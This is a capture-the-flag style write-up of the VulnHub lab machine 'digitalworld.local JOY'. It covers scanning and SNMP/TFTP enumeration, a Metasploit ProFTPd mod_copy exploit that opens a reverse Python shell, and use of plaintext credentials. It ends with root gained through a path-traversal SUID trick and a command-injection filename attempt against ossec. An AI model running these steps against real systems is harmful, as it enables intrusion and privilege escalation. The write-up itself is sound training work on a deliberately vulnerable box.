---
title: Vulnhub - digitalworld.local JOY
description: My writeup on digitalworld.local JOY box.
categories:
 - vulnhub
tags: vulnhub udp snmp nse tftp ProFTPd searchsploit metasploit
---

![](https://i.imgur.com/h3KUnSs.png)

## Box Stats

| Box Info      | Details       | 
| ------------- |:-------------:| 
| Box Name :    | **digitalworld.local JOY**  | 
| Series :      | **digitalworld.local**           |
| Difficulty :  | **Medium/Hard**      |   
| Release Date :| **31 Mar 2019**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | **Donavan**      | 
| Download :    | [digitalworld.local JOY](https://www.vulnhub.com/entry/digitalworldlocal-joy,298/){:target="_blank"}      | 

## Summary

digitalworld.local JOY was a pretty good & realistic box that i really enjoyed pwning. Let’s pwn it! :sunglasses:

## Enumeration/Reconnaissance

Let's start as always with nmap.

TCP Scan:

```
$ ip=192.168.1.19
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 23:19 EEST
Nmap scan report for joy.zte.com.cn (192.168.1.19)
Host is up (0.00057s latency).
Not shown: 65523 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 08:00:27:6D:C5:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds
$ nmap -p 21,22,25,80,110,139,143,445,465,587,993,995 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 23:20 EEST
Stats: 0:05:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.96% done; ETC: 23:25 (0:00:01 remaining)
Nmap scan report for joy.zte.com.cn (192.168.1.19)
Host is up (0.00044s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
110/tcp open  pop3?
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
```

UDP Scan:

```
$ nmap -p- --min-rate 10000 -sU $ip                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 23:26 EEST
Warning: 192.168.1.19 giving up on port because retransmission cap hit (10).
Nmap scan report for joy.zte.com.cn (192.168.1.19)
Host is up (0.00079s latency).
Not shown: 65454 open|filtered ports, 78 closed ports
PORT    STATE SERVICE
123/udp open  ntp
137/udp open  netbios-ns
161/udp open  snmp
```

Ton of services, let's start with FTP since we have anonymous allowed. Once we connect we can see 2 directories `download/upload` the `upload` directory has lot of stuff in. One file the `directory` has the "copy" of Patrick's directory. Let's download it & analyze it:

```
$ ftp $ip
Connected to 192.168.1.19.
220 The Good Tech Inc. FTP Server
Name (192.168.1.19:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 .
drwxr-x---   4 ftp      ftp          4096 Jan  6  2019 ..
-rwxrwxr-x   1 ftp      ftp          2312 Oct  9 20:33 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
226 Transfer complete
ftp> get directory
local: directory remote: directory
200 PORT command successful
150 Opening BINARY mode data connection for directory (2312 bytes)
226 Transfer complete
2312 bytes received in 0.00 secs (13.8673 MB/s)
ftp> exit
```

`directory` file contents:

```
Patrick's Directory

total 116
drwxr-xr-x 18 patrick patrick 4096 Oct 10 04:30 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-r--r--  1 patrick patrick    0 Oct 10 04:25 7pYsPPfWWJGuEcxGzrCIaan0R5PZxasS.txt
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
-rw-r--r--  1 patrick patrick   24 Oct 10 04:30 dvPzl5ksSoFc1f4s5wB9aJSE4w5Ckbnp0IxVAOPveiqONxpUuwle0GktTWY9ZY9S.txt
-rw-r--r--  1 patrick patrick   24 Oct 10 04:25 eLkugh9zZn90nDbkTWqZATIXNkuEnS3BDEDaK21jqkA7TPB1sleyH447hyXe2Go9.txt
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
d---------  2 root    root    4096 Jan  9  2019 script
-rw-r--r--  1 patrick patrick    0 Oct 10 04:20 SOqnxq7l9smzwdSfatyfFdnzXk9zyC8g.txt
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos
-rw-r--r--  1 patrick patrick   24 Oct 10 04:20 wKtEXVOvDSqfqlkUVSMz6lbV21bwBqjZv8VajeyO2m6yXkWfZ7wTLCq8ZAkLdCxb.txt
-rw-r--r--  1 patrick patrick    0 Oct 10 04:30 Xuc1ngPttrOz9HoFPek6OjXDHVhLSfC6.txt

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```

One file is interesting here is the `version_control` but how can we download it? If we go back to UDP scan we can see that `snmp` is opened. Simple Network Management Protocol(SNMP) allows devices to communicate. Let's enumerate SNMP, i always prefer to use Nmap Scripting Engine(NSE) for it. Let's search for available NSE scripts:

```
$ ls /usr/share/nmap/scripts | grep "snmp"
snmp-brute.nse
snmp-hh3c-logins.nse
snmp-info.nse
snmp-interfaces.nse
snmp-ios-config.nse
snmp-netstat.nse
snmp-processes.nse
snmp-sysdescr.nse
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse
```

The `snmp-processes.nse` seems good, let's fire it up! There will be a huge output but one of them reveals a really interesting info. TFTP is running under port `36969` on `/home/patrick` so that means we can download the file we want!

```
$ nmap -p 161 -sU --script snmp-processes $ip  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 23:51 EEST
Nmap scan report for joy.zte.com.cn (192.168.1.19)
Host is up (0.00045s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-processes: 
..data..
|   716: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
```

Let's download the file:

```
$ tftp $ip 36969
tftp> get version_control
Received 419 bytes in 0.0 seconds
tftp> quit
```

```
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
```

## Shell as www-data

`ProFTPd` version seems vulnerable, let's fire up `searchsploit` to search for possible exploits:

```
$ searchsploit ProFTPd 1.3.5
------------------------------------------------------------------------------------------
 Exploit Title                                                 |  Path
------------------------------------------------------------------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)      | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution            | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                      | linux/remote/36742.txt
------------------------------------------------------------------------------------------ 
```

Perfect we can have RCE! Let's fire up metasploit.

```
$ service postgresql start; msfconsole
 
msf5 > search name:proftpd type:exploit

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/freebsd/ftp/proftp_telnet_iac   2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   1  exploit/linux/ftp/proftp_sreplace       2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/linux/ftp/proftp_telnet_iac     2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   3  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   4  exploit/unix/ftp/proftpd_modcopy_exec   2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution

msf5 > use exploit/unix/ftp/proftpd_modcopy_exec
```

Now for the settings, we need a writable path that's the `/var/www/tryingharderisjoy` we found before.

```
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.1.19
RHOSTS => 192.168.1.19
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/tryingharderisjoy
SITEPATH => /var/www/tryingharderisjoy
```

Now a really important thing is the payload option, most people forget to add it & exploit fail.

```
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show payloads
Compatible Payloads
===================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  cmd/unix/bind_awk                             manual  No     Unix Command Shell, Bind TCP (via AWK)
   1  cmd/unix/bind_perl                            manual  No     Unix Command Shell, Bind TCP (via Perl)
   2  cmd/unix/bind_perl_ipv6                       manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3  cmd/unix/generic                              manual  No     Unix Command, Generic Command Execution
   4  cmd/unix/reverse_awk                          manual  No     Unix Command Shell, Reverse TCP (via AWK)
   5  cmd/unix/reverse_perl                         manual  No     Unix Command Shell, Reverse TCP (via Perl)
   6  cmd/unix/reverse_perl_ssl                     manual  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  cmd/unix/reverse_python                       manual  No     Unix Command Shell, Reverse TCP (via Python)
   8  cmd/unix/reverse_python_ssl                   manual  No     Unix Command Shell, Reverse TCP SSL (via python)

msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set LHOST eth0
LHOST => eth0
```

Let's fire it up!

```
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > exploit

[*] Started reverse TCP handler on 192.168.1.14:4444 
[*] 192.168.1.19:80 - 192.168.1.19:21 - Connected to FTP server
[*] 192.168.1.19:80 - 192.168.1.19:21 - Sending copy commands to FTP server
[*] 192.168.1.19:80 - Executing PHP payload /k0FQx7m.php
[*] Command shell session 1 opened (192.168.1.14:4444 -> 192.168.1.19:44038) at 2020-10-10 00:26:26 +0300

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@JOY:/var/www/tryingharderisjoy$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
```

## Shell as patrick

Under `/var/www/tryingharderisjoy/ossec` there is a file called `patricksecretsofjoy` that contains patrick's password:

```
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

We can now switch to user patrick:

```
www-data@JOY:/var/www/tryingharderisjoy/ossec$ su - patrick
Password: apollo098765

patrick@JOY:~$ whoami;id
patrick
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
```

## Shell as root

Checking the `sudo -l` we can run a file as root:

```
patrick@JOY:~$ sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
```

This file allows us to change permission to a file, so let's make `/bin/bash` SUID. We will do a trick we will use `..` to move to a parent directory.

```
patrick@JOY:~$ sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
../../../../bin/bash
../../../../bin/bash
What permissions would you like to set the file to?
4757
4757
Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:~$ /bin/bash -p
bash-4.4# whoami;id
root
uid=1000(patrick) gid=1000(patrick) euid=0(root) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
```

## Reading the flag(s)

```
bash-4.4# cat proof.txt
Never grant sudo permissions on scripts that perform system functions!
```

## For readers

I think the box has another privilege escalation way but i wasn't able to exploit it. :( I hope you guys can help me out with it. I believe its about `ossec` there is an [exploit](https://www.exploit-db.com/exploits/37265){:target="_blank"} I tried to do this as user `www-data` but didn't work:

```
touch "y-\$(chmod 777 root)"
```

If you find a way to exploit this, please send me a message! :)

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:

Until next time keep pwning hard! :fire:
